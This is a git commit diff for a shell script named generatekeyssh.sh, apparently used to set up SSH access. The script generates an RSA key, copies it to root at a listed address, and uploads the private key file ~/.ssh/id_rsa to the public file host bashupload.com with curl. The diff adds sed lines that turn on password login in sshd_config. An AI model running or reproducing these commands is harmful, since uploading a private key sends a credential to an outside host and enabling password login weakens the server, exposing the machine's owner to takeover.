06a54218985d0781f1b2e95a18a1ea1cffc19558
lamtota40 <lamtota40@gmail.com>
2023-04-23 21:35:37 +0700

    Update generatekeyssh.sh

--- generatekeyssh.sh
+++ generatekeyssh.sh
@@ -3,7 +3,10 @@ ssh-keygen -t rsa
 logname
 hostname -I | awk '{print $1}'
 ssh-copy-id root@109.111.222.333
-
 curl --upload-file ~/.ssh/id_rsa https://bashupload.com
 curl --upload-file ~/.ssh/id_rsa.pub https://bashupload.com
+
+sed -i 's/PasswordAuthentication .*/PasswordAuthentication yes/g' /etc/ssh/sshd_config
+sed -i 's/#PubkeyAuthentication .*/PubkeyAuthentication yes/g' /etc/ssh/sshd_config
+
 
